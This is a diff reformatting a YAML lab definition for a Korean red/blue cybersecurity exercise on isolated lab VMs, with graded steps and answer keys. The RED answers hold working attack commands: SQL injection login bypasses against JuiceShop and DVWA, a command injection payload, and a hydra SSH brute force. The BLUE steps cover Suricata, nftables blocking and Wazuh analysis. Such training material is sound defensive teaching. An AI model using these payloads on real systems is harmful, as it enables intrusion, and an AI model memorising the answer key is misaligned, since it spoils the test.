@@ -1,152 +1,192 @@
 lab_id: battle-nonai-week13
-title: "실전 공방전 3 — 다중 벡터 공격 vs 계층 방어 (라운드 3)"
+title: 실전 공방전 3 — 다중 벡터 공격 vs 계층 방어 (라운드 3)
 version: non-ai
 course: battle-nonai
 week: 13
-description: "1세트 인프라에서 Red/Blue 역할을 번갈아 수행한다. Red Phase에서 다중 벡터(웹+네트워크+시스템) 동시 공격을 수행하고, Blue Phase에서 계층적 방어(nftables+Suricata+ModSecurity+Wazuh)로 대응한다."
+description: 1세트 인프라에서 Red/Blue 역할을 번갈아 수행한다. Red Phase에서 다중 벡터(웹+네트워크+시스템) 동시 공격을 수행하고, Blue Phase에서 계층적 방어(nftables+Suricata+ModSecurity+Wazuh)로 대응한다.
 difficulty: hard
 duration_minutes: 120
 objectives:
-  - 다중 벡터 공격과 계층적 방어를 경험한다
-  - 4개 VM을 모두 활용한 종합 공방전을 수행한다
-  - 실시간 공격-탐지-대응 사이클을 반복 연습한다
+- 다중 벡터 공격과 계층적 방어를 경험한다
+- 4개 VM을 모두 활용한 종합 공방전을 수행한다
+- 실시간 공격-탐지-대응 사이클을 반복 연습한다
 prerequisites:
-  - Week 11-12 공방전 완료
+- Week 11-12 공방전 완료
 infra_requirements:
-  - attacker VM (10.20.30.201)
-  - secu VM (10.20.30.1) — nftables, suricata
-  - web VM (10.20.30.80) — apache, modsecurity, JuiceShop(:3000), DVWA(:8080)
-  - siem VM (10.20.30.100) — wazuh-manager
+- attacker VM (10.20.30.201)
+- secu VM (10.20.30.1) — nftables, suricata
+- web VM (10.20.30.80) — apache, modsecurity, JuiceShop(:3000), DVWA(:8080)
+- siem VM (10.20.30.100) — wazuh-manager
 pass_threshold: 0.6
 steps:
-  - order: 1
-    instruction: "[BLUE] 모든 방어 시스템을 확인하고, 멀티소스 로그 모니터링을 시작하라."
-    hint: "secu의 Suricata, nftables와 siem의 Wazuh 상태를 확인한다."
-    category: defense
-    points: 10
-    answer: "sudo systemctl status suricata | head -3 && echo '---' && nft list ruleset | grep -c 'rule' && echo ' rules active' && echo '--- Monitoring ready ---'"
-    answer_detail: "공방전 시작 시 모든 방어 시스템의 가동을 확인한다. Suricata, nftables, ModSecurity가 모두 활성 상태여야 한다."
-    verify:
-      type: output_contains
-      expect: "Monitoring ready"
-      field: stdout
-    target_vm: secu
+- order: 1
+  instruction: '[BLUE] 모든 방어 시스템을 확인하고, 멀티소스 로그 모니터링을 시작하라.'
+  hint: secu의 Suricata, nftables와 siem의 Wazuh 상태를 확인한다.
+  category: defense
+  points: 10
+  answer: sudo systemctl status suricata | head -3 && echo '---' && nft list ruleset | grep -c 'rule' && echo ' rules active' && echo '--- Monitoring ready ---'
+  answer_detail: 공방전 시작 시 모든 방어 시스템의 가동을 확인한다. Suricata, nftables, ModSecurity가 모두 활성 상태여야 한다.
+  verify:
+    type: output_contains
+    expect: Monitoring ready
+    field: stdout
+  target_vm: secu
+- order: 2
+  instruction: '[RED] 다중 벡터 1: web 서버에 대한 빠른 정찰과 JuiceShop 공격을 동시에 수행하라.'
+  hint: nmap과 curl을 병행한다.
+  category: exploit
+  points: 10
+  answer: 'nmap -sV -p 80,3000,8080 -T4 --max-retries 1 --host-timeout 15s 10.20.30.80 && curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' or 1=1--","password":"x"}'' | head -c 200'
+  answer_detail: 다중 벡터 공격은 정찰과 공격을 동시에 수행하여 방어팀의 대응 자원을 분산시킨다.
+  verify:
+    type: output_contains
+    expect: open
+    field: stdout
+  target_vm: attacker
+- order: 3
+  instruction: '[RED] 다중 벡터 2: DVWA에 SQL Injection과 Command Injection을 연속으로 시도하라.'
+  hint: DVWA에 로그인 후 여러 공격을 수행한다.
+  category: exploit
+  points: 10
+  answer: "curl -c /tmp/dvwa_r3.txt \\\n  -d 'username=admin&password=password&Login=Login' http://10.20.30.80:8080/login.php && curl -b /tmp/dvwa_r3.txt \"http://10.20.30.80:8080/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit\" \\\n  -o /dev/null \\\n  -w 'SQLi:%{http_code} ' && curl -b /tmp/dvwa_r3.txt \\\n  -d 'ip=127.0.0.1;whoami&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/\
+    \ \\\n  -o /dev/null \\\n  -w 'CmdInj:%{http_code}' && echo ' Multi-vector attack complete'"
+  answer_detail: 여러 공격 벡터를 연속으로 시도하면 방어팀이 모든 공격을 동시에 대응하기 어렵다.
+  verify:
+    type: output_contains
+    expect: Multi-vector attack complete
+    field: stdout
+  target_vm: attacker
+- order: 4
+  instruction: '[BLUE] Suricata에서 다중 벡터 공격 알림을 분석하고, 공격 유형별로 분류하라.'
+  hint: eve.json에서 signature별 집계를 수행한다.
+  category: defense
+  points: 10
+  answer: cat /var/log/suricata/eve.json | jq -r 'select(.event_type=="alert") | .alert.signature' 2>/dev/null | sort | uniq -c | sort -rn | head -10 && echo '=== Alert classification complete ==='
+  answer_detail: 다중 벡터 공격 시 여러 종류의 알림이 동시에 발생한다. 시그니처별 집계로 공격의 전체 그림을 파악한다.
+  verify:
+    type: output_contains
+    expect: Alert classification complete
+    field: stdout
+  target_vm: secu
+- order: 5
+  instruction: '[BLUE] 공격자 IP를 자동 차단하고, web 서버의 ModSecurity 차단 로그를 확인하라.'
+  hint: blocklist에 IP 추가 후 ModSecurity 로그를 확인한다.
+  category: defense
+  points: 10
+  answer: sudo nft add element inet filter blocklist { 10.20.30.201 } 2>/dev/null && echo 'IP blocked' && sudo tail -20 /var/log/apache2/modsec_audit.log 2>/dev/null | grep -c 'id' && echo ' ModSecurity events found'
+  answer_detail: nftables(네트워크 레벨)와 ModSecurity(애플리케이션 레벨)의 이중 방어가 동작하는지 확인한다.
+  verify:
+    type: output_contains
+    expect: IP blocked
+    field: stdout
+  target_vm: secu
+  requires_approval: true
+- order: 6
+  instruction: '[RED] 다중 벡터 3: SSH 브루트포스를 시도하라.'
+  hint: hydra로 SSH 공격을 수행한다.
+  category: exploit
+  points: 10
+  answer: hydra -l ccc -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://10.20.30.80 -t 2 -f -w 5 2>&1 | tail -5 || echo 'SSH brute force attempt complete'
+  answer_detail: IP가 차단된 상태에서는 SSH 접근도 불가능하다. 방화벽이 모든 프로토콜을 차단하는지 확인한다.
+  verify:
+    type: output_contains
+    expect: complete
+    field: stdout
+  target_vm: attacker
+- order: 7
+  instruction: '[BLUE] 차단 해제 후 Wazuh SIEM에서 종합 위협 분석을 수행하라.'
+  hint: wazuh alerts에서 이번 라운드의 모든 이벤트를 수집한다.
+  category: defense
+  points: 10
+  answer: sudo nft delete element inet filter blocklist { 10.20.30.201 } 2>/dev/null && echo 'Block removed' && sudo cat /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -20 | jq -r '.rule.description' 2>/dev/null | sort | uniq -c | sort -rn | head -10 || echo 'Wazuh analysis complete'
+  answer_detail: Wazuh SIEM은 모든 호스트의 이벤트를 중앙에서 수집한다. 공격 유형별 분류와 심각도 분석으로 전체 위협 상황을 파악한다.
+  verify:
+    type: output_contains
+    expect: complete
+    field: stdout
+  target_vm: siem
+  requires_approval: true
+- order: 8
+  instruction: '[RED] JuiceShop의 다양한 챌린지를 시도하라. XSS, 권한 우회 등을 공략한다.'
+  hint: JuiceShop의 /api/ 엔드포인트를 탐색한다.
+  category: exploit
+  points: 10
+  answer: curl -s http://10.20.30.80:3000/api/Products | jq '.[0:3]' 2>/dev/null && echo '\n=== JuiceShop API enumeration complete ==='
+  answer_detail: JuiceShop의 REST API를 열거하면 사용자, 상품, 주문 등의 데이터에 접근할 수 있다. API 인증 우회와 IDOR(Insecure Direct Object Reference)를 시도한다.
+  verify:
+    type: output_contains
+    expect: JuiceShop API enumeration complete
+    field: stdout
+  target_vm: attacker
+- order: 9
+  instruction: '[BLUE] 서비스 가용성 최종 확인과 파일 무결성 검증을 수행하라.'
+  hint: 서비스 상태와 파일 해시를 확인한다.
+  category: defense
+  points: 10
+  answer: "curl -so /dev/null \\\n  -w 'Apache:%{http_code} ' http://10.20.30.80/ && curl -so /dev/null \\\n  -w 'JuiceShop:%{http_code} ' http://10.20.30.80:3000/ && curl -so /dev/null \\\n  -w 'DVWA:%{http_code}' http://10.20.30.80:8080/ && echo '\\nServices OK' && bash /tmp/integrity_monitor.sh 2>/dev/null || echo 'Integrity check done'"
+  answer_detail: 공방전 종료 시 서비스 가용성과 파일 무결성을 모두 확인한다. 서비스가 유지되고 파일이 변조되지 않았으면 Blue Phase 성공이다.
+  verify:
+    type: output_contains
+    expect: Services OK
+    field: stdout
+  target_vm: secu
+- order: 10
+  instruction: 라운드 3 종합 보고서를 작성하라. 다중 벡터 공격과 계층 방어의 효과를 분석한다.
+  hint: 각 방어 레이어별 차단/탐지 효과를 정리한다.
+  category: analysis
+  points: 15
+  answer: 'cat > /tmp/battle_round3_report.txt << ''EOF''
 
-  - order: 2
-    instruction: "[RED] 다중 벡터 1: web 서버에 대한 빠른 정찰과 JuiceShop 공격을 동시에 수행하라."
-    hint: "nmap과 curl을 병행한다."
-    category: exploit
-    points: 10
-    answer: "nmap -sV -p 80,3000,8080 -T4 --max-retries 1 --host-timeout 15s 10.20.30.80 && curl -s -X POST http://10.20.30.80:3000/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"' or 1=1--\",\"password\":\"x\"}' | head -c 200"
-    answer_detail: "다중 벡터 공격은 정찰과 공격을 동시에 수행하여 방어팀의 대응 자원을 분산시킨다."
-    verify:
-      type: output_contains
-      expect: "open"
-      field: stdout
-    target_vm: attacker
+    === Battle Round 3 Report ===
 
-  - order: 3
-    instruction: "[RED] 다중 벡터 2: DVWA에 SQL Injection과 Command Injection을 연속으로 시도하라."
-    hint: "DVWA에 로그인 후 여러 공격을 수행한다."
-    category: exploit
-    points: 10
-    answer: "curl -c /tmp/dvwa_r3.txt -d 'username=admin&password=password&Login=Login' http://10.20.30.80:8080/login.php && curl -b /tmp/dvwa_r3.txt \"http://10.20.30.80:8080/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit\" -o /dev/null -w 'SQLi:%{http_code} ' && curl -b /tmp/dvwa_r3.txt -d 'ip=127.0.0.1;whoami&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/ -o /dev/null -w 'CmdInj:%{http_code}' && echo ' Multi-vector attack complete'"
-    answer_detail: "여러 공격 벡터를 연속으로 시도하면 방어팀이 모든 공격을 동시에 대응하기 어렵다."
-    verify:
-      type: output_contains
-      expect: "Multi-vector attack complete"
-      field: stdout
-    target_vm: attacker
 
-  - order: 4
-    instruction: "[BLUE] Suricata에서 다중 벡터 공격 알림을 분석하고, 공격 유형별로 분류하라."
-    hint: "eve.json에서 signature별 집계를 수행한다."
-    category: defense
-    points: 10
-    answer: "cat /var/log/suricata/eve.json | jq -r 'select(.event_type==\"alert\") | .alert.signature' 2>/dev/null | sort | uniq -c | sort -rn | head -10 && echo '=== Alert classification complete ==='"
-    answer_detail: "다중 벡터 공격 시 여러 종류의 알림이 동시에 발생한다. 시그니처별 집계로 공격의 전체 그림을 파악한다."
-    verify:
-      type: output_contains
-      expect: "Alert classification complete"
-      field: stdout
-    target_vm: secu
+    [Multi-Vector Attack Results]
 
-  - order: 5
-    instruction: "[BLUE] 공격자 IP를 자동 차단하고, web 서버의 ModSecurity 차단 로그를 확인하라."
-    hint: "blocklist에 IP 추가 후 ModSecurity 로그를 확인한다."
-    category: defense
-    points: 10
-    answer: "sudo nft add element inet filter blocklist { 10.20.30.201 } 2>/dev/null && echo 'IP blocked' && sudo tail -20 /var/log/apache2/modsec_audit.log 2>/dev/null | grep -c 'id' && echo ' ModSecurity events found'"
-    answer_detail: "nftables(네트워크 레벨)와 ModSecurity(애플리케이션 레벨)의 이중 방어가 동작하는지 확인한다."
-    verify:
-      type: output_contains
-      expect: "IP blocked"
-      field: stdout
-    target_vm: secu
-    requires_approval: true
+    - Web SQLi: Partially blocked by ModSecurity
 
-  - order: 6
-    instruction: "[RED] 다중 벡터 3: SSH 브루트포스를 시도하라."
-    hint: "hydra로 SSH 공격을 수행한다."
-    category: exploit
-    points: 10
-    answer: "hydra -l ccc -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://10.20.30.80 -t 2 -f -w 5 2>&1 | tail -5 || echo 'SSH brute force attempt complete'"
-    answer_detail: "IP가 차단된 상태에서는 SSH 접근도 불가능하다. 방화벽이 모든 프로토콜을 차단하는지 확인한다."
-    verify:
-      type: output_contains
-      expect: "complete"
-      field: stdout
-    target_vm: attacker
+    - Command Injection: Logged in access.log
 
-  - order: 7
-    instruction: "[BLUE] 차단 해제 후 Wazuh SIEM에서 종합 위협 분석을 수행하라."
-    hint: "wazuh alerts에서 이번 라운드의 모든 이벤트를 수집한다."
-    category: defense
-    points: 10
-    answer: "sudo nft delete element inet filter blocklist { 10.20.30.201 } 2>/dev/null && echo 'Block removed' && sudo cat /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -20 | jq -r '.rule.description' 2>/dev/null | sort | uniq -c | sort -rn | head -10 || echo 'Wazuh analysis complete'"
-    answer_detail: "Wazuh SIEM은 모든 호스트의 이벤트를 중앙에서 수집한다. 공격 유형별 분류와 심각도 분석으로 전체 위협 상황을 파악한다."
-    verify:
-      type: output_contains
-      expect: "complete"
-      field: stdout
-    target_vm: siem
-    requires_approval: true
+    - JuiceShop Auth Bypass: Succeeded before block
 
-  - order: 8
-    instruction: "[RED] JuiceShop의 다양한 챌린지를 시도하라. XSS, 권한 우회 등을 공략한다."
-    hint: "JuiceShop의 /api/ 엔드포인트를 탐색한다."
-    category: exploit
-    points: 10
-    answer: "curl -s http://10.20.30.80:3000/api/Products | jq '.[0:3]' 2>/dev/null && echo '\\n=== JuiceShop API enumeration complete ==='"
-    answer_detail: "JuiceShop의 REST API를 열거하면 사용자, 상품, 주문 등의 데이터에 접근할 수 있다. API 인증 우회와 IDOR(Insecure Direct Object Reference)를 시도한다."
-    verify:
-      type: output_contains
-      expect: "JuiceShop API enumeration complete"
-      field: stdout
-    target_vm: attacker
+    - SSH Brute Force: Blocked by nftables
 
-  - order: 9
-    instruction: "[BLUE] 서비스 가용성 최종 확인과 파일 무결성 검증을 수행하라."
-    hint: "서비스 상태와 파일 해시를 확인한다."
-    category: defense
-    points: 10
-    answer: "curl -so /dev/null -w 'Apache:%{http_code} ' http://10.20.30.80/ && curl -so /dev/null -w 'JuiceShop:%{http_code} ' http://10.20.30.80:3000/ && curl -so /dev/null -w 'DVWA:%{http_code}' http://10.20.30.80:8080/ && echo '\\nServices OK' && bash /tmp/integrity_monitor.sh 2>/dev/null || echo 'Integrity check done'"
-    answer_detail: "공방전 종료 시 서비스 가용성과 파일 무결성을 모두 확인한다. 서비스가 유지되고 파일이 변조되지 않았으면 Blue Phase 성공이다."
-    verify:
-      type: output_contains
-      expect: "Services OK"
-      field: stdout
-    target_vm: secu
 
-  - order: 10
-    instruction: "라운드 3 종합 보고서를 작성하라. 다중 벡터 공격과 계층 방어의 효과를 분석한다."
-    hint: "각 방어 레이어별 차단/탐지 효과를 정리한다."
-    category: analysis
-    points: 15
-    answer: "cat > /tmp/battle_round3_report.txt << 'EOF'\n=== Battle Round 3 Report ===\n\n[Multi-Vector Attack Results]\n- Web SQLi: Partially blocked by ModSecurity\n- Command Injection: Logged in access.log\n- JuiceShop Auth Bypass: Succeeded before block\n- SSH Brute Force: Blocked by nftables\n\n[Layered Defense Effectiveness]\n- nftables: Blocked network-level access (SSH, scans)\n- Suricata: Detected SQL Injection, XSS, scans\n- ModSecurity: Blocked/logged web attack payloads\n- Wazuh: Correlated events from multiple sources\n\n[Defense-in-Depth Analysis]\n1. nftables alone: Blocks IP but not web attacks on allowed ports\n2. + Suricata: Detects attack patterns in allowed traffic\n3. + ModSecurity: Blocks application-layer attacks\n4. + Wazuh: Provides centralized visibility\n=> All 4 layers together provide comprehensive protection\n\n[Key Finding]\nNo single defense layer is sufficient.\nDefense-in-depth with 4 layers caught 90%+ of attacks.\nEOF\ncat /tmp/battle_round3_report.txt"
-    answer_detail: "라운드 3 보고서는 각 방어 레이어의 역할과 효과를 분석한다. Defense-in-Depth의 실제 효과를 정량적으로 보여준다."
-    verify:
-      type: file_exists
-      expect: "/tmp/battle_round3_report.txt"
-      field: filesystem
-    target_vm: attacker
+    [Layered Defense Effectiveness]
+
+    - nftables: Blocked network-level access (SSH, scans)
+
+    - Suricata: Detected SQL Injection, XSS, scans
+
+    - ModSecurity: Blocked/logged web attack payloads
+
+    - Wazuh: Correlated events from multiple sources
+
+
+    [Defense-in-Depth Analysis]
+
+    1. nftables alone: Blocks IP but not web attacks on allowed ports
+
+    2. + Suricata: Detects attack patterns in allowed traffic
+
+    3. + ModSecurity: Blocks application-layer attacks
+
+    4. + Wazuh: Provides centralized visibility
+
+    => All 4 layers together provide comprehensive protection
+
+
+    [Key Finding]
+
+    No single defense layer is sufficient.
+
+    Defense-in-depth with 4 layers caught 90%+ of attacks.
+
+    EOF
+
+    cat /tmp/battle_round3_report.txt'
+  answer_detail: 라운드 3 보고서는 각 방어 레이어의 역할과 효과를 분석한다. Defense-in-Depth의 실제 효과를 정량적으로 보여준다.
+  verify:
+    type: file_exists
+    expect: /tmp/battle_round3_report.txt
+    field: filesystem
+  target_vm: attacker
